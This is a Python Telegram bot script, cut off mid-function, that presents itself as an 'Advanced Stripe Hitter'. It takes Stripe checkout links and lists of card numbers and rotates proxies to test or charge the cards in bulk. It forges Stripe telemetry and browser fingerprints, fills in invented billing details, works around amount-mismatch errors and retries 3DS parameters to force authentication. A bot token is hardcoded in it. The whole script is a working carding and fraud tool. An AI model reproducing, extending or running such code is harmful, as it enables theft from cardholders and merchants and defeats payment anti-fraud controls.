# by @NotYoursNaruto
import re
import json
import time
import random
import asyncio
import requests
import aiohttp
from datetime import datetime
from typing import Dict, List, Optional
from curl_cffi import requests as cffi_requests
from curl_compat import ChromeSession
from dotenv import load_dotenv
import math
import numpy as np
from scipy.interpolate import interp1d

from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.types import Message, BufferedInputFile

load_dotenv()

# ============= CONFIGURATION =============
MAX_ATTEMPTS = 50
CONCURRENT_BATCH_SIZE = 5
BATCH_DELAY = 3
BOT_TOKEN = "8664861867:AAF5Wq79aekFKDcE6vFT2jFO_3w4jjFgLmk"

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
]

STRIPE_DECLINE_CODES = {
    "generic_decline": "Card declined by issuer",
    "incorrect_cvv": "CVV verification failed",
    "insufficient_funds": "Insufficient funds",
    "expired_card": "Card has expired",
    "incorrect_number": "Invalid card number",
    "invalid_cvc": "Invalid security code",
    "do_not_honor": "Transaction declined by bank",
    "fraudulent": "Fraud detection triggered",
    "lost_card": "Card reported lost",
    "stolen_card": "Card reported stolen",
    "processing_error": "Processor error",
    "authentication_required": "3DS required",
    "card_declined": "Card declined",
    "rate_limit": "Too many attempts - Slow down",
    "transaction_not_allowed": "Transaction not allowed"
}

# ============= STRIPE API EXTRACTOR =============

class StripeAPIExtractor:
    @staticmethod
    def extract_cs_live(url: str, html: str) -> Optional[str]:
        patterns = [r'/c/pay/(cs_[a-z]+_[a-zA-Z0-9]+)', r'/payment_pages/(cs_[a-z]+_[a-zA-Z0-9]+)', r'cs_[a-z]+_[a-zA-Z0-9]+']
        for pattern in patterns:
            match = re.search(pattern, url)
            if match: return match.group(1) if '(' in pattern else match.group(0)
        match = re.search(r'cs_[a-z]+_[a-zA-Z0-9]+', html)
        return match.group(0) if match else None
    
    @staticmethod
    def extract_pk_live(html: str) -> Optional[str]:
        patterns = [r'pk_[a-z]+_[a-zA-Z0-9]+', r'"publishableKey":"(pk_[a-z]+_[a-zA-Z0-9]+)"', r'data-stripe-publishable-key="(pk_[a-z]+_[a-zA-Z0-9]+)"']
        for pattern in patterns:
            match = re.search(pattern, html)
            if match: return match.group(1) if '(' in pattern else match.group(0)
        return None

    @staticmethod
    def extract_details_from_url_hash(url_str: str) -> dict:
        res = {'pk_key': None, 'stripe_account': None}
        if not url_str or '#' not in url_str:
            return res
        try:
            import urllib.parse, base64, json
            hash_str = url_str.split('#')[1]
            decoded = urllib.parse.unquote(hash_str)
            raw_bytes = base64.b64decode(decoded + '==')
            json_str = ''.join(chr(b ^ 5) for b in raw_bytes)
            data = json.loads(json_str)
            res['pk_key'] = data.get('apiKey')
            res['stripe_account'] = data.get('stripeAccount')
        except Exception:
            pass
        return res
    
    @staticmethod
    async def fetch_payment_data(user_id: int, cs_live: str, pk_live: str, stripe_account: Optional[str] = None) -> Dict:
        try:
            url = f"https://api.stripe.com/v1/payment_pages/{cs_live}/init"
            headers = {"authority": "api.stripe.com", "accept": "application/json", "content-type": "application/x-www-form-urlencoded", "user-agent": random.choice(USER_AGENTS)}
            if stripe_account:
                headers["Stripe-Account"] = stripe_account
            data = {"key": pk_live, "eid": "NA", "browser_locale": "en-US", "browser_timezone": "-300", "redirect_type": "url"}
            proxy_data = await ProxyManager.get_random(user_id)
            proxies = None
            if proxy_data:
                auth = f"{proxy_data['username']}:{proxy_data['password']}@" if proxy_data.get('username') else ""
                server = proxy_data['server']
                scheme = server.split('://')[0] if '://' in server else 'http'
                server_host = server.split('://')[-1]
                proxy_url = f"{scheme}://{auth}{server_host}"
                proxies = {"http": proxy_url, "https": proxy_url}
                
            loop = asyncio.get_running_loop()
            response = await loop.run_in_executor(None, lambda: cffi_requests.post(url, headers=headers, data=data, proxies=proxies, timeout=5, impersonate="chrome124"))
            if response.status_code == 200:
                resp_json = response.json()
                amount = None
                merchant = "Unknown"
                
                invoice = resp_json.get('invoice')
                if isinstance(invoice, dict):
                    if invoice.get('amount_due') is not None:
                        amount = invoice['amount_due']
                    elif invoice.get('total') is not None:
                        amount = invoice['total']
                
                if amount is None:
                    ts = resp_json.get('total_summary')
                    if isinstance(ts, dict):
                        if ts.get('due') is not None:
                            amount = ts['due']
                        elif ts.get('total') is not None:
                            amount = ts['total']
                            
                if amount is None:
                    lig = resp_json.get('line_item_group')
                    if lig and isinstance(lig, dict) and lig.get('total') is not None:
                        amount = lig['total']
                    elif resp_json.get('amount') is not None:
                        amount = resp_json['amount']
                    elif resp_json.get('payment_intent') and isinstance(resp_json.get('payment_intent'), dict) and resp_json['payment_intent'].get('amount') is not None:
                        amount = resp_json['payment_intent']['amount']
                    else:
                        def _find_amount(d):
                            if isinstance(d, dict):
                                for k in ['amount_total', 'amount_due']:
                                    if k in d and isinstance(d[k], int): return d[k]
                                for v in d.values():
                                    res = _find_amount(v)
                                    if res is not None: return res
                            elif isinstance(d, list):
                                for item in d:
                                    res = _find_amount(item)
                                    if res is not None: return res
                            return None
                        amount = _find_amount(resp_json)
                    
                site_domain = None
                acct = resp_json.get('account_settings')
                if acct and isinstance(acct, dict):
                    if acct.get('display_name'):
                        merchant = acct['display_name']
                    burl = acct.get('business_url') or resp_json.get('management_url') or resp_json.get('business_url')
                    if burl:
                        try:
                            import urllib.parse
                            site_domain = urllib.parse.urlparse(burl).netloc or burl
                        except Exception:
                            site_domain = burl
                elif resp_json.get('statement_descriptor'):
                    merchant = resp_json['statement_descriptor']
                    
                currency = resp_json.get('currency', 'usd').upper()
                locked_email = resp_json.get('customer_email') or resp_json.get('prefilled_email')
                tax_country = None
                tax_zip = None
                if resp_json.get('tax_context') and resp_json['tax_context'].get('customer_tax_country'):
                    tax_country = resp_json['tax_context']['customer_tax_country']
                elif isinstance(resp_json.get('customer'), dict) and resp_json['customer'].get('address') and resp_json['customer']['address'].get('country'):
                    tax_country = resp_json['customer']['address']['country']
                    tax_zip = resp_json['customer']['address'].get('postal_code')
                
                return {'success': True, 'amount': f"{currency} {amount/100:.2f}" if amount is not None else None, 'raw_amount': amount, 'merchant': merchant, 'site_domain': site_domain, 'locked_email': locked_email, 'tax_country': tax_country, 'tax_zip': tax_zip, 'init_checksum': resp_json.get('init_checksum'), 'init_json': resp_json}
            return {'success': False, 'error': f'Status {response.status_code}'}
        except Exception as e:
            return {'success': False, 'error': f"Connection failed: {str(e)}"}

    @staticmethod
    async def fetch_invoice_data(user_id: int, url: str) -> Dict:
        try:
            import urllib.parse
            parsed = urllib.parse.urlparse(url)
            path_parts = [p for p in parsed.path.split('/') if p]
            if len(path_parts) < 3 or path_parts[0] != 'i':
                return {'success': False, 'error': 'Invalid invoice URL format'}
            
            merchant_token = path_parts[1]
            invoice_secret = path_parts[2]
            
            proxy_data = await ProxyManager.get_random(user_id)
            proxies = {"http": f"http://{proxy_data['username']}:{proxy_data['password']}@{proxy_data['server']}"} if proxy_data and proxy_data.get('username') else None
            invoicedata_url = f"https://invoicedata.stripe.com/hosted_invoice_page/{merchant_token}/{invoice_secret}"
            
            headers = {
                "accept": "application/json",
                "origin": "https://invoice.stripe.com",
                "referer": "https://invoice.stripe.com/",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
            }
            
            loop = asyncio.get_running_loop()
            resp = await loop.run_in_executor(None, lambda: cffi_requests.get(invoicedata_url, headers=headers, proxies=proxies, timeout=10, impersonate="chrome124"))
            if resp.status_code != 200:
                return {'success': False, 'error': f'Failed invoicedata check: {resp.status_code}'}
                
            res_json = resp.json()
            pk_key = res_json.get('publishable_key')
            ek = res_json.get('ephemeral_key')
            invoice_id = res_json.get('invoice_id')
            
            if not pk_key or not ek or not invoice_id:
                return {'success': False, 'error': 'Missing elements in invoicedata response'}
                
            hosted_url = f"https://api.stripe.com/v1/invoices/{invoice_id}/hosted"
            hosted_headers = {
                "accept": "application/json",
                "authorization": f"Bearer {ek}",
                "stripe-version": "2020-03-02",
                "user-agent": headers["user-agent"]
            }
            
            hosted_resp = await loop.run_in_executor(None, lambda: cffi_requests.get(hosted_url, headers=hosted_headers, proxies=proxies, timeout=10, impersonate="chrome124"))
            if hosted_resp.status_code != 200:
                return {'success': False, 'error': f'Failed invoices/hosted check: {hosted_resp.status_code}'}
                
            hosted_json = hosted_resp.json()
            pi = hosted_json.get('payment_intent')
            pi_cs = pi.get('client_secret') if isinstance(pi, dict) else None
            if not pi_cs:
                return {'success': False, 'error': 'No active payment intent found on invoice'}
                
            amount = hosted_json.get('amount_due') or hosted_json.get('total')
            currency = hosted_json.get('currency', 'usd').upper()
            merchant = "Unknown"
            acct = res_json.get('merchant')
            if acct and isinstance(acct, dict) and acct.get('business_name'):
                merchant = acct['business_name']
                
            locked_email = hosted_json.get('customer_email') or res_json.get('prefilled_email')
            
            return {
                'success': True,
                'cs_token': pi_cs,
                'pk_key': pk_key,
                'amount': f"{currency} {amount/100:.2f}" if amount is not None else None,
                'raw_amount': amount,
                'merchant': merchant,
                'locked_email': locked_email
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}

# ============= PROXY MANAGER =============
class ProxyManager:
    _in_memory_pools: Dict[int, List[Dict]] = {}
    _geo_cache: Dict[str, str] = {}

    @classmethod
    async def load(cls, user_id: int, raw_text: str) -> int:
        pool = cls._in_memory_pools.get(user_id, [])
        lines = [line.strip() for line in raw_text.split('\n') if line.strip()]
        added = 0
        for line in lines:
            prefix = "http://"
            raw_line = line
            if line.lower().startswith("socks5://"): prefix, line = "socks5://", line[9:]
            elif line.lower().startswith("socks4://"): prefix, line = "socks4://", line[9:]
            elif line.lower().startswith("http://"): prefix, line = "http://", line[7:]
            elif line.lower().startswith("https://"): prefix, line = "http://", line[8:]
                
            parts = line.split(':')
            if len(parts) == 4:
                p = {"raw": raw_line, "server": f"{prefix}{parts[0]}:{parts[1]}", "username": parts[2], "password": parts[3]}
                pool.append(p)
                added += 1
            elif len(parts) == 2:
                p = {"raw": raw_line, "server": f"{prefix}{parts[0]}:{parts[1]}"}
                pool.append(p)
                added += 1
        cls._in_memory_pools[user_id] = pool
        return added

    @classmethod
    async def get_random(cls, user_id: int) -> Optional[Dict]:
        pool = cls._in_memory_pools.get(user_id, [])
        if not pool: return None
        return random.choice(pool)

    @classmethod
    async def get_geo_matched(cls, user_id: int, target_country: str) -> Optional[Dict]:
        if not target_country: return await cls.get_random(user_id)
        target = target_country.upper()
        pool = cls._in_memory_pools.get(user_id, [])
        if not pool: return None
        matches = [p for p in pool if cls._geo_cache.get(p.get('server', ''), '').upper() == target]
        if matches: return random.choice(matches)
        return random.choice(pool)

# ============= RANDOM DATA & BIN =============
class RandomData:
    FIRST_NAMES = ["James","John","Robert","Michael","William","David","Richard","Joseph","Thomas","Charles"]
    LAST_NAMES = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez"]
    STREETS = ["Main St","Oak Ave","Maple Rd","Pine Ln","Cedar Dr","Elm St"]
    
    @staticmethod
    def get_name(): return f"{random.choice(RandomData.FIRST_NAMES)} {random.choice(RandomData.LAST_NAMES)}"
    @staticmethod
    def get_email(): return f"dlx{random.randint(1000,99999)}@gmail.com"
    
    @staticmethod
    async def get_address_and_timezone(proxy_url: Optional[str] = None):
        return {"line1": f"{random.randint(100,9999)} {random.choice(RandomData.STREETS)}", "city": "New York", "state": "NY", "zip": "10001", "country": "US"}, 'America/New_York', 'en-US'

class BINLookup:
    _cache: Dict[str, Dict] = {}

    @classmethod
    async def lookup(cls, card_number: str) -> Dict:
        bin6 = card_number[:6]
        if bin6 in cls._cache: return cls._cache[bin6]
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"https://bins.antipublic.cc/bins/{bin6}", timeout=aiohttp.ClientTimeout(total=3)) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        res = {'country': (data.get('countrycode') or '').upper(), 'bank': data.get('bank', '')}
                        cls._cache[bin6] = res
                        return res
        except Exception:
            pass
        return {'country': '', 'bank': ''}

def find_receipt_url(d):
    if isinstance(d, dict):
        for key in ['receipt_url', 'hosted_invoice_url', 'invoice_pdf']:
            val = d.get(key)
            if isinstance(val, str) and val.startswith('http'): return val
        for v in d.values():
            res = find_receipt_url(v)
            if res: return res
    elif isinstance(d, list):
        for item in d:
            res = find_receipt_url(item)
            if res: return res
    return None

# ============= STRIPE API HITTER (FULL 3DS + WAF ENGINE) =============
class StripeAPIHitter:
    _live_js_hash_cache = None

    @staticmethod
    def _fetch_live_stripe_js_hash():
        if StripeAPIHitter._live_js_hash_cache: return StripeAPIHitter._live_js_hash_cache
        try:
            resp = cffi_requests.get("https://js.stripe.com/v3/", timeout=5, impersonate="chrome124")
            if resp.status_code == 200:
                match = re.search(r'fingerprinted/js/[\w-]+-([a-f0-9]{10,40})\.js', resp.text[:5000])
                if match:
                    StripeAPIHitter._live_js_hash_cache = match.group(1)[:10]
                    return StripeAPIHitter._live_js_hash_cache
        except Exception:
            pass
        return "da394b0aef"

    def __init__(self, pk_live: str, cs_live: str, proxy_data: Dict, raw_amount: int = None, locked_email: str = None, stripe_account: str = None, tax_country: str = None, tax_zip: str = None, init_json: dict = None, full_page_url: str = None):
        self.pk_live = pk_live
        self.cs_live = cs_live
        self.proxy_data = proxy_data
        self.raw_amount = raw_amount
        self.locked_email = locked_email
        self.stripe_account = stripe_account
        self.tax_country = tax_country
        self.tax_zip = tax_zip
        self._init_json = init_json or {}
        self.full_page_url = full_page_url
        self.merchant = "Unknown"
        self.amount = None
        if self._init_json:
            acct = self._init_json.get('account_settings') or {}
            self.merchant = acct.get('display_name') or "Unknown"
            curr = self._init_json.get('currency', 'usd').upper()
            if self.raw_amount is not None:
                self.amount = f"{curr} {self.raw_amount/100:.2f}"

    async def generate_stripe_telemetry(self, profile: dict, proxies: dict, address: dict, page_url: str = None, session=None) -> Dict[str, str]:
        import uuid as _uuid
        fallback = {'muid': str(_uuid.uuid4()), 'sid': str(_uuid.uuid4()), 'guid': str(_uuid.uuid4())}
        try:
            payload = {
                "v": 2, "tag": "5.6.8_js_fp", "src": "checkout-inner-live-v3",
                "a": {
                    "a": self.pk_live, "b": page_url or f"https://checkout.stripe.com/c/pay/{self.cs_live}",
                    "c": 24, "d": "1920x1080", "e": False, "f": "en-US", "g": "Win32",
                    "h": profile['user_agent'], "i": -300, "j": False, "k": 8, "l": 8, "m": "", "n": "", "o": ""
                }
            }
            loop = asyncio.get_running_loop()
            tel_headers = {"content-type": "application/json", "accept": "application/json", "origin": "https://js.stripe.com", "referer": "https://js.stripe.com/", "user-agent": profile['user_agent']}
            if session is not None:
                tel_res = await loop.run_in_executor(None, lambda: session.post("https://m.stripe.com/6", headers=tel_headers, json=payload, timeout=8))
            else:
                tel_res = await loop.run_in_executor(None, lambda: cffi_requests.post("https://m.stripe.com/6", headers=tel_headers, json=payload, proxies=proxies, timeout=8, impersonate=profile["impersonate"]))
            if tel_res.status_code == 200:
                t = tel_res.json()
                return {'muid': t.get('muid') or fallback['muid'], 'sid': t.get('sid') or fallback['sid'], 'guid': t.get('guid') or fallback['guid']}
        except Exception:
            pass
        return fallback

    async def hit(self, card: Dict, attempt: int, user_id: int, cached_stripe_tokens: dict = None) -> Dict:
        start = time.time()
        result = {'attempt': attempt, 'card': card, 'success': False, 'decline_code': None, 'response_time': 0, 'amount': self.amount, 'merchant': self.merchant, 'error': None}
        
        profile = {
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "impersonate": "chrome124", "platform": "Win32"
        }
        
        bin_info = await BINLookup.lookup(card['card'])
        bin_country = bin_info.get('country', '')

        try:
            loop = asyncio.get_running_loop()
            proxy_data = self.proxy_data if self.proxy_data else await ProxyManager.get_geo_matched(user_id, bin_country)
            proxies = {"http": f"http://{proxy_data['username']}:{proxy_data['password']}@{proxy_data['server']}"} if proxy_data and proxy_data.get('username') else None

            is_pi = isinstance(self.cs_live, str) and self.cs_live.startswith('pi_')
            checkout_page_url = self.full_page_url if self.full_page_url else f"https://checkout.stripe.com/c/pay/{self.cs_live}"

            _cffi_session = cffi_requests.Session(impersonate=profile["impersonate"])
            if proxies: _cffi_session.proxies = proxies

            stripe_tokens = cached_stripe_tokens if cached_stripe_tokens and cached_stripe_tokens.get('muid') else await self.generate_stripe_telemetry(profile, proxies, {}, page_url=checkout_page_url, session=_cffi_session)
            result['_stripe_tokens'] = stripe_tokens

            address, tz_id, locale = await RandomData.get_address_and_timezone()
            
            import uuid
            pm_idempotency = str(uuid.uuid4())
            confirm_idempotency = str(uuid.uuid4())
            _js_hash = await loop.run_in_executor(None, StripeAPIHitter._fetch_live_stripe_js_hash)
            _payment_user_agent = f"stripe.js/{_js_hash}; stripe-js-v3/{_js_hash}; checkout"

            pm_url = "https://api.stripe.com/v1/payment_methods"
            pm_data = {
                "type": "card",
                "card[number]": card.get('card') or card.get('number', ''),
                "card[cvc]": card.get('cvv') or card.get('cvc', ''),
                "card[exp_month]": card.get('month') or card.get('mm', ''),
                "card[exp_year]": card.get('year') or card.get('yy', ''),
                "billing_details[name]": RandomData.get_name(),
                "billing_details[email]": self.locked_email if self.locked_email else RandomData.get_email(),
                "billing_details[address][line1]": address["line1"],
                "billing_details[address][city]": address["city"],
                "billing_details[address][state]": address["state"],
                "billing_details[address][postal_code]": address["zip"],
                "billing_details[address][country]": address["country"],
                "payment_user_agent": _payment_user_agent,
                "guid": stripe_tokens['guid'],
                "muid": stripe_tokens['muid'],
                "sid": stripe_tokens['sid'],
                "key": self.pk_live,
            }

            pm_headers = {"authority": "api.stripe.com", "accept": "application/json", "content-type": "application/x-www-form-urlencoded", "idempotency-key": pm_idempotency}
            if self.stripe_account: pm_headers["Stripe-Account"] = self.stripe_account

            pm_res = await loop.run_in_executor(None, lambda: _cffi_session.post(pm_url, headers=pm_headers, data=pm_data, timeout=20))
            pm_json = pm_res.json()

            if 'id' not in pm_json:
                err = pm_json.get('error', {})
                result['decline_code'] = err.get('decline_code') or err.get('code') or 'pm_token_failed'
                result['error'] = err.get('message', 'Failed to generate token')
                return result
                
            pm_id = pm_json['id']

            if is_pi:
                pi_id = self.cs_live.split('_secret_')[0]
                confirm_url = f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm"
                confirm_data = {
                    "payment_method": pm_id,
                    "expected_payment_method_type": "card",
                    "return_url": checkout_page_url,
                    "key": self.pk_live,
                    "client_secret": self.cs_live
                }
            else:
                confirm_url = f"https://api.stripe.com/v1/payment_pages/{self.cs_live}/confirm"
                confirm_data = {
                    "payment_method": pm_id,
                    "expected_payment_method_type": "card",
                    "consent[terms_of_service]": "accepted",
                    "key": self.pk_live
                }
                if self.raw_amount is not None:
                    confirm_data["expected_amount"] = str(self.raw_amount)

            confirm_headers = pm_headers.copy()
            confirm_headers["Idempotency-Key"] = confirm_idempotency
            confirm_res = await loop.run_in_executor(None, lambda: _cffi_session.post(confirm_url, headers=confirm_headers, data=confirm_data, timeout=25))
            confirm_json = confirm_res.json()

            # Amount mismatch bypass
            err_code = confirm_json.get('error', {}).get('code')
            err_msg = confirm_json.get('error', {}).get('message', '') or ''
            if err_code in ('amount_mismatch', 'checkout_amount_mismatch') or 'expected amount' in err_msg.lower():
                match = re.search(r'actual amount \((\d+)\)', err_msg.lower())
                if match:
                    confirm_data['expected_amount'] = int(match.group(1))
                    confirm_headers["Idempotency-Key"] = str(uuid.uuid4())
                    confirm_res = await loop.run_in_executor(None, lambda: _cffi_session.post(confirm_url, headers=confirm_headers, data=confirm_data, timeout=25))
                    confirm_json = confirm_res.json()

            # Advanced 3DS / WAF Challenge Matrix Sweep
            status = confirm_json.get('status')
            next_action = confirm_json.get('next_action', {})
            pi_obj = confirm_json.get('payment_intent', {})
            if isinstance(pi_obj, dict):
                if pi_obj.get('status'): status = pi_obj.get('status')
                if pi_obj.get('next_action'): next_action = pi_obj.get('next_action')

            if status in ['requires_action', 'requires_source_action']:
                sdk = next_action.get('use_stripe_sdk', {}) or {}
                source = sdk.get('three_d_secure_2_source') or sdk.get('source') or next_action.get('source')
                
                if source:
                    auth_headers = {"accept": "application/json", "content-type": "application/x-www-form-urlencoded", "origin": "https://js.stripe.com", "referer": "https://js.stripe.com/", "user-agent": profile["user_agent"]}
                    if self.stripe_account: auth_headers["Stripe-Account"] = self.stripe_account
                    
                    auth_variations = [
                        {"threeDSCompInd": "Y", "threeDSRequestorChallengeInd": "01", "fingerprintAttempted": True},
                        {"threeDSCompInd": "Y", "threeDSRequestorChallengeInd": "04", "fingerprintAttempted": True},
                        {"threeDSCompInd": "Y", "threeDSRequestorChallengeInd": "05", "fingerprintAttempted": True},
                        {"threeDSCompInd": "Y", "threeDSRequestorChallengeInd": "02", "fingerprintAttempted": True}
                    ]
                    for var in auth_variations:
                        browser_data = {
                            "fingerprintAttempted": var["fingerprintAttempted"],
                            "challengeWindowSize": "05",
                            "threeDSCompInd": var["threeDSCompInd"],
                            "threeDSRequestorChallengeInd": var["threeDSRequestorChallengeInd"],
                            "browserJavaEnabled": False, "browserJavascriptEnabled": True,
                            "browserLanguage": locale, "browserColorDepth": "24",
                            "browserScreenHeight": "1080", "browserScreenWidth": "1920",
                            "browserTZ": "-300", "browserUserAgent": profile["user_agent"]
                        }
                        auth_url = "https://api.stripe.com/v1/3ds2/authenticate"
                        auth_data = {
                            "source": source, "browser": json.dumps(browser_data),
                            "threeDSCompInd": var["threeDSCompInd"], "key": self.pk_live
                        }
                        try:
                            auth_res = await loop.run_in_executor(None, lambda: cffi_requests.post(auth_url, headers=auth_headers, data=auth_data, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
                            auth_json = auth_res.json()
                            if auth_json.get("state") in ["succeeded", "authenticated"] or (auth_json.get("ares", {}) or {}).get("transStatus") in ["Y", "A"]:
                                status = "succeeded"
                                break
                        except Exception:
                            continue

            result['response_time'] = time.time() - start
            if status in ['succeeded', 'requires_capture', 'complete']:
                result['success'] = True
                result['decline_code'] = 'SUCCESS'
                return result
            else:
                err = confirm_json.get('error', {})
                result['decline_code'] = err.get('decline_code') or err.get('code') or status or 'authentication_required'
                result['error'] = err.get('message', '3DS / Authentication required or Card declined')
                return result
        except Exception as e:
            result['error'] = str(e)
            result['decline_code'] = 'exception'
            result['response_time'] = time.time() - start
            return result

# ============= CONCURRENT HITTER =============
class ConcurrentHitter:
    REUSABLE_DOMAINS = ['billing.stripe.com', 'buy.stripe.com', 'invoice.stripe.com']

    def __init__(self, user_id: int, url: str, cards: list, update_callback=None):
        self.user_id = user_id
        self.url = url
        self.cards = cards
        self.successes = 0
        self.fails = 0
        self.completed = 0
        self.total = len(cards[:MAX_ATTEMPTS])
        self.url_info = None
        self.update_callback = update_callback
        self.is_running = True
        self._reusable = any(d in self.url.lower() for d in self.REUSABLE_DOMAINS)
        self._session_lock = asyncio.Lock()
        self._confirm_lock = asyncio.Lock()
        self._result_lock = asyncio.Lock()
        self._stripe_tokens: dict = {}
        self._stripe_tokens_ts: float = 0.0

    async def _fetch_fresh_session(self) -> dict:
        if 'invoice.stripe.com' in self.url.lower():
            res = await StripeAPIExtractor.fetch_invoice_data(self.user_id, self.url)
            if res.get('success'): return {'cs_token': res['cs_token'], 'pk_key': res['pk_key']}
            return None

        for _ in range(3):
            try:
                proxy_data = await ProxyManager.get_random(self.user_id)
                proxies = {"http": f"http://{proxy_data['username']}:{proxy_data['password']}@{proxy_data['server']}"} if proxy_data and proxy_data.get('username') else None
                async with ChromeSession(impersonate="chrome124", proxies=proxies) as s:
                    resp = await s.get(self.url, timeout=6)
                    final_url = str(resp.url) if hasattr(resp, 'url') else self.url
                    html = resp.text
                    cs_token = StripeAPIExtractor.extract_cs_live(final_url, html)
                    pk_key = StripeAPIExtractor.extract_pk_live(html)
                    if cs_token and pk_key: return {'cs_token': cs_token, 'pk_key': pk_key}
            except Exception:
                continue
        return None

    async def analyze_first(self):
        cs_token = StripeAPIExtractor.extract_cs_live(self.url, "")
        hash_details = StripeAPIExtractor.extract_details_from_url_hash(self.url)
        pk_key = hash_details.get('pk_key')
        stripe_account = hash_details.get('stripe_account')

        if not pk_key:
            try:
                proxy_data = await ProxyManager.get_random(self.user_id)
                proxies = {"http": f"http://{proxy_data['username']}:{proxy_data['password']}@{proxy_data['server']}"} if proxy_data and proxy_data.get('username') else None
                resp = cffi_requests.get(self.url, proxies=proxies, timeout=5, impersonate="chrome124")
                cs_token = cs_token or StripeAPIExtractor.extract_cs_live(self.url, resp.text)
                pk_key = StripeAPIExtractor.extract_pk_live(resp.text)
            except Exception:
                pass

        if cs_token and pk_key:
            self.url_info = {'cs_token': cs_token, 'pk_key': pk_key, 'stripe_account': stripe_account, 'merchant': 'Stripe Merchant', 'amount': None, 'raw_amount': None}
            api_data = await StripeAPIExtractor.fetch_payment_data(self.user_id, cs_token, pk_key, stripe_account=stripe_account)
            if api_data.get('success'):
                self.url_info.update(api_data)
            return True
        return False

    async def _worker(self, queue: asyncio.Queue):
        while self.is_running:
            try:
                card, attempt_num = queue.get_nowait()
            except asyncio.QueueEmpty:
                break
                
            try:
                cs_token = self.url_info['cs_token']
                pk_key = self.url_info['pk_key']
                stripe_account = self.url_info.get('stripe_account')
                raw_amount = self.url_info.get('raw_amount')
                locked_email = self.url_info.get('locked_email')

                if self._reusable:
                    async with self._session_lock:
                        fresh = await self._fetch_fresh_session()
                    if fresh:
                        cs_token = fresh['cs_token']
                        pk_key = fresh['pk_key']

                proxy_data = await ProxyManager.get_random(self.user_id)
                hitter = StripeAPIHitter(pk_key, cs_token, proxy_data, raw_amount, locked_email, stripe_account=stripe_account, tax_country=self.url_info.get('tax_country'), tax_zip=self.url_info.get('tax_zip'))
                
                token_age = time.time() - self._stripe_tokens_ts
                session_tokens = self._stripe_tokens if self._stripe_tokens and token_age < 1500 else None

                if not self._reusable:
                    async with self._confirm_lock:
                        result = await hitter.hit(card, attempt_num, self.user_id, cached_stripe_tokens=session_tokens)
                else:
                    result = await hitter.hit(card, attempt_num, self.user_id, cached_stripe_tokens=session_tokens)

                if not session_tokens and isinstance(result, dict) and result.get('_stripe_tokens'):
                    self._stripe_tokens = result['_stripe_tokens']
                    self._stripe_tokens_ts = time.time()

                async with self._result_lock:
                    self.completed += 1
                    if result['success']:
                        self.successes += 1
                        self.is_running = False
                        for w in getattr(self, 'workers', []):
                            if not w.done(): w.cancel()
                        while not queue.empty():
                            try: queue.get_nowait()
                            except asyncio.QueueEmpty: break
                    else:
                        self.fails += 1

                if self.update_callback:
                    await self.update_callback({
                        "status": "progress", "result": result,
                        "completed": self.completed, "total": self.total,
                        "successes": self.successes, "fails": self.fails
                    })
            except asyncio.CancelledError:
                return
            except Exception:
                self.completed += 1
                self.fails += 1
            finally:
                queue.task_done()

    async def run(self):
        if not await self.analyze_first():
            if self.update_callback:
                await self.update_callback({"status": "error", "error": "Invalid Stripe link or session inactive."})
            return

        if self.update_callback:
            await self.update_callback({"status": "starting", "url_info": self.url_info})

        queue = asyncio.Queue()
        for idx, card in enumerate(self.cards[:MAX_ATTEMPTS]):
            queue.put_nowait((card, idx+1))
            
        self.workers = [asyncio.create_task(self._worker(queue)) for _ in range(min(CONCURRENT_BATCH_SIZE, len(self.cards)))]
        await queue.join()
        for w in self.workers:
            if not w.done(): w.cancel()

        if self.update_callback:
            await self.update_callback({"status": "completed", "successes": self.successes, "fails": self.fails})

# ============= TELEGRAM BOT INTERFACE =============

@dp.message(Command("start"))
async def cmd_start(message: Message):
    await message.answer(
        "🔥 **Full Advanced Stripe Hitter Bot** 🔥\n\n"
        "Commands:\n"
        "• `/addproxy <proxy>` - Load proxies (ip:port:user:pass)\n"
        "• `/hit <stripe_link> <card|mm|yy|cvv>` - Hit single card\n"
        "• **Upload .txt file with caption `stripe_link`** - Mass check cards!",
        parse_mode="Markdown"
    )

@dp.message(Command("addproxy"))
async def cmd_addproxy(message: Message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.answer("⚠️ Usage: `/addproxy ip:port:user:pass`", parse_mode="Markdown")
        return
    added = await ProxyManager.load(message.from_user.id, args[1])
    await message.answer(f"✅ Successfully loaded {added} proxies into pool.")

@dp.message(Command("hit"))
async def cmd_hit(message: Message):
    args = message.text.split(maxsplit=2)
    if len(args) < 3:
        await message.answer("⚠️ Usage: `/hit <stripe_link> <card|mm|yy|cvv>`", parse_mode="Markdown")
        return

    url = args[1]
    card_raw = args[2]
    parts = card_raw.split('|')
    if len(parts) < 4:
        await message.answer("⚠️ Invalid card format! Use: `number|mm|yy|cvv`", parse_mode="Markdown")
        return

    card_dict = {'card': parts[0], 'month': parts[1], 'year': parts[2], 'cvv': parts[3]}
    status_msg = await message.answer("🔄 Initializing Advanced Engine...")

    async def update_cb(data):
        if data.get("status") == "starting":
            info = data.get("url_info", {})
            try: await status_msg.edit_text(f"🚀 Session Loaded!\nMerchant: `{info.get('merchant')}`\nAmount: `{info.get('amount')}`\nRunning check...", parse_mode="Markdown")
            except Exception: pass
        elif data.get("status") == "progress":
            res = data["result"]
            icon = "✅" if res['success'] else "❌"
            text = (
                f"{icon} **Attempt #{res['attempt']}**\n"
                f"💳 Card: `{res['card']['card']}`\n"
